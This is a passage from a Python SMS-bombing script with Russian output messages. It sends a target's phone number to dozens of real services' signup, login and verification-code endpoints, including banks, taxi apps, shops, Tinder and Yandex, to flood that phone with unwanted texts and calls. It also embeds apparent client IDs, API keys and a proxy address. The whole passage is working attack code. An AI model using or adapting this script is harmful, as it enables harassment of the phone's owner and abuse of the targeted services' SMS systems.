                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.flipkart.com/api/6/user/signup/status",
                    headers={
                        "Origin": "https://www.flipkart.com",
                        "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
                    },
                    json={"loginId": "+" + _phone, "supportAllStates": True},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://lk.invitro.ru/lk2/lka/patient/refreshCode",
                    data={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://online.sbis.ru/reg/service/",
                    json={
                        "jsonrpc": "2.0",
                        "protocol": "5",
                        "method": "Пользователь.ЗаявкаНаФизика",
                        "params": {"phone": _phone},
                        "id": "1",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://moscow.rutaxi.ru/ajax_keycode.html", data={"l": _phone9}
                ).json()["res"]
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://my.citrus.ua/api/v2/register",
                    data={
                        "email": email,
                        "name": "Артем",
                        "12phone": _phone,
                        "password": password,
                        "confirm_password": password,
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://my.citrus.ua/api/auth/login", {"identity": _phoneCitrus}
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://my.modulbank.ru/api/v2/registration/nameAndPhone",
                    json={
                        "FirstName": "Артем",
                        "CellPhone": _phone,
                        "Package": "optimal",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.moyo.ua/identity/registration",
                    data={"firstname": "Артем", "phone": _phone, "email": _email},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://comfy.ua/ua/customer/account/createPost",
                    data={
                        "registration_name": "Артем",
                        "registration_phone": _phoneComfy,
                        "registration_email": _mail,
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.foxtrot.com.ua/ru/account/sendcodeagain?Length=12",
                    data={"Phone": _phoneQ},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://cinema5.ru/api/phone_code", data={"phone": _phonePizzahut}
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.etm.ru/cat/runprog.html",
                    data={
                        "m_phone": _phone,
                        "mode": "sendSms",
                        "syf_prog": "clients-services",
                        "getSysParam": "yes",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://apteka.ru/_action/auth/getForm/",
                    data={
                        "form[NAME]": "",
                        "form[PERSONAL_GENDER]": "",
                        "form[PERSONAL_BIRTHDAY]": "",
                        "form[EMAIL]": "",
                        "form[LOGIN]": _phone585,
                        "form[PASSWORD]": password,
                        "get-new-password": "Получите пароль по SMS",
                        "user_agreement": "on",
                        "personal_data_agreement": "on",
                        "formType": "simple",
                        "utc_offset": "120",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://ube.pmsm.org.ru/esb/iqos-phone/validate",
                    json={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://secunda.com.ua/personalarea/registrationvalidphone",
                    data={"ph": "+" + _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "http://api.rozamira-azs.ru/v1/auth", data={"login": _phone,}
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",
                    params={"msisdn": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.get(
                    "https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code",
                    params={"number": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.iconjob.co/api/auth/verification_code",
                    json={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://panda99.ru/bdhandlers/order.php?t={int(time())}",
                    data={"CB_NAME": "Артем", "CB_PHONE": _phone88},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://auth.pizza33.ua/ua/join/check/",
                    params={
                        "callback": "angular.callbacks._1",
                        "email": _email,
                        "password": password,
                        "phone": _phone,
                        "utm_current_visit_started": 0,
                        "utm_first_visit": 0,
                        "utm_previous_visit": 0,
                        "utm_times_visited": 0,
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": _phone}
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://zoloto585.ru/api/bcard/reg/",
                    json={
                        "name": "Максим",
                        "surname": "Летовал",
                        "patronymic": "Максимович",
                        "sex": "m",
                        "birthdate": "11.11.1999",
                        "phone": _phone585,
                        "email": email,
                        "city": "Москва",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode",
                    data={"phone": _phone585},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.foxtrot.com.ua/ru/account/sendcodeagain?Length=12",
                    data={"Phone": _phoneQ},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/",
                    data={"RECALL": "Y", "BACK_CALL_PHONE": _phone},
                )
            except:
                pass
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php",
                    data={"demo_number": "+" + _phone, "ajax_demo_send": "1"},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.flipkart.com/api/5/user/otp/generate",
                    headers={
                        "Origin": "https://www.flipkart.com",
                        "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
                    },
                    data={"loginId": "+" + _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.flipkart.com/api/6/user/signup/status",
                    headers={
                        "Origin": "https://www.flipkart.com",
                        "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
                    },
                    json={"loginId": "+" + _phone, "supportAllStates": True},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://bamper.by/registration/?step=1",
                    data={
                        "phone": "+" + _phone,
                        "submit": "Запросить смс подтверждения",
                        "rules": "on",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://friendsclub.ru/assets/components/pl/connector.php",
                    data={"casePar": "authSendsms", "MobilePhone": "+" + _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://app.salampay.com/api/system/sms/c549d0c2-ee78-4a98-659d-08d682a42b29",
                    data={"caller_number": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://app.doma.uchi.ru/api/v1/parent/signup_start",
                    json={
                        "phone": "+" + _phone,
                        "first_name": "-",
                        "utm_data": {},
                        "via": "call",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://app.doma.uchi.ru/api/v1/parent/signup_start",
                    json={
                        "phone": "+" + _phone,
                        "first_name": "-",
                        "utm_data": {},
                        "via": "sms",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.icq.com/smsreg/requestPhoneValidation.php",
                    data={
                        "msisdn": _phone,
                        "locale": "en",
                        "countryCode": "ru",
                        "version": "1",
                        "k": "ic1rtwz1s1Hj1O0r",
                        "r": "46763",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://shafa.ua/api/v3/graphiql",
                    json={
                        "operationName": "RegistrationSendSms",
                        "variables": {"phoneNumber": "+" + _phone},
                        "query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n	isSuccess\n	userToken\n	errors {\n	  field\n	  messages {\n		message\n		code\n		__typename\n	  }\n	  __typename\n	}\n	__typename\n  }\n}\n",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://alpari.com/api/en/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/",
                    headers={"Referer": "https://alpari.com/en/registration/"},
                    json={
                        "client_type": "personal",
                        "email": _email,
                        "mobile_phone": _phone,
                        "deliveryOption": "sms",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://uklon.com.ua/api/v1/account/code/send",
                    headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},
                    json={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://crm.getmancar.com.ua/api/veryfyaccount",
                    json={
                        "phone": "+" + _phone,
                        "grant_type": "password",
                        "client_id": "gcarAppMob",
                        "client_secret": "SomeRandomCharsAndNumbersMobile",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post("https://auth.multiplex.ua/login", json={"login": _phone})
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                    data={
                        "password": password,
                        "application": "lkp",
                        "login": "+" + _phone,
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://secure.ubki.ua/b2_api_xml/ubki/auth",
                    json={
                        "doc": {
                            "auth": {
                                "mphone": "+" + _phone,
                                "bdate": "11.11.1999",
                                "deviceid": "00100",
                                "version": "1.0",
                                "source": "site",
                                "signature": "undefined",
                            }
                        }
                    },
                    headers={"Accept": "application/json"},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.top-shop.ru/login/loginByPhone/",
                    data={"phone": _phonePizzahut},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.rendez-vous.ru/ajax/SendPhoneConfirmationNew/",
                    data={"phone": _phonePizzahut, "alien": "0"},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://osava.ua/users/sign-up/callbacks",
                    data={"phone_callbacks": _phone, "send_callbacks": "Отправить"},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://eda.yandex/api/v1/user/request_authentication_code",
                    json={"phone_number": "+" + _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://izi.ua/api/auth/register",
                    json={
                        "phone": "+" + _phone,
                        "name": "Анастасия",
                        "is_terms_accepted": True,
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://izi.ua/api/auth/sms-login", json={"phone": "+" + _phone}
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.pozichka.ua/v1/registration/send",
                    json={"RegisterSendForm": {"phone": _phonePozichka}},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://ontaxi.com.ua/api/v2/web/client",
                    data={"country": "UA", "phone": phone[3:]},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://suandshi.ru/mobile_api/register_mobile_user",
                    params={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php",
                    data={"data": _phone, "metod": "postreg"},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode",
                    data={"telephone": "8" + _phone[1:]},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.moyo.ua/identity/registration",
                    data={"firstname": "Артем", "phone": _phone, "email": email},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://belkacar.ru/get-confirmation-code",
                    data={"phone": _phone},
                    headers={},
                    proxies=proxies,
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://starpizzacafe.com/mods/a.function.php",
                    data={"aj": "50", "registration-phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
                    data={"phone_number": _phone},
                    headers={},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://app.karusel.ru/api/v1/phone/",
                    data={"phone": _phone},
                    headers={},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.tinkoff.ru/v1/sign_up",
                    data={"phone": "+" + _phone},
                    headers={},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://dostavista.ru/backend/send-verification-sms",
                    data={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.monobank.com.ua/api/mobapplink/send",
                    data={"phone": "+" + _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    f"https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone={_phone}",
                    data={"result": "ok"},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post("https://alfalife.cc/auth.php", data={"phone": _phone})
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://koronapay.com/transfers/online/api/users/otps",
                    data={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://btfair.site/api/user/phone/code",
                    json={"phone": "+" + _phone,},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://ggbet.ru/api/auth/register-with-phone",
                    data={
                        "phone": "+" + _phone,
                        "login": _email,
                        "password": password,
                        "agreement": "on",
                        "oferta": "on",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.etm.ru/cat/runprog.html",
                    data={
                        "m_phone": _phone,
                        "mode": "sendSms",
                        "syf_prog": "clients-services",
                        "getSysParam": "yes",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://thehive.pro/auth/signup", json={"phone": "+" + _phone,}
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.mtstv.ru/v1/users", json={"msisdn": _phone}, headers={}
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://account.my.games/signup_send_sms/", data={"phone": _phone}
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://zoloto585.ru/api/bcard/reg/",
                    json={
                        "name": _name,
                        "surname": _name,
                        "patronymic": _name,
                        "sex": "m",
                        "birthdate": "11.11.1999",
                        "phone": (_phone, "+* (***) ***-**-**"),
                        "email": _email,
                        "city": "Москва",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post("https://kasta.ua/api/v2/login/", data={"phone": _phone})
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://cloud.mail.ru/api/v2/notify/applink",
                    json={
                        "phone": "+" + _phone,
                        "api": 2,
                        "email": "email",
                        "x-email": "x-email",
                    },
                    proxies={"http": "138.197.137.39:8080"},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.creditter.ru/confirm/sms/send",
                    json={"phone": (_phone, "+* (***) ***-**-**"), "type": "register",},
                )
                kk = kk + 1
                print(
